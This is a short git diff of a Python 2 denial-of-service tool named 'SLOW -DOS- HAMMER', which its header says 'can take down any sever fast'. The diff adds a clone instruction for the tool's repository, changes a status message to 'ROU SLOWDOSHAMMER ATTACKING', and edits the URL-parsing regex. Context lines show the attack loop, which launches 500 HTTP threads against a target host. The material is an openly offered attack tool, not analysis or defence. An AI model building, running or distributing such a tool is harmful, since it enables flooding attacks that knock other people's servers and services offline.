@@ -1,3 +1,4 @@
+# copy #  git clone https://github.com/ROU001/SlowDOsHammer.git # into cmd promt 
 # ----------------------------------------------------------------------------------------------
 # SLOW -DOS- HAMMER
 #A dos tool that can take down any sever fast 
@@ -122,7 +123,7 @@ def httpcall(url):
 	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
-			print 'Response Code 500'
+			print 'ROU SLOWDOSHAMMER ATTACKING'
 			code=500
 	except urllib2.URLError, e:
 			#print e.reason
@@ -168,7 +169,7 @@ else:
 		url = sys.argv[1]
 		if url.count("/")==2:
 			url = url + "/"
-		m = re.search('https\://([^/]*)/?.*', url)
+		m = re.search('http\://([^/]*)/?.*', url)
 		host = m.group(1)
 		for i in range(500):
 			t = HTTPThread()
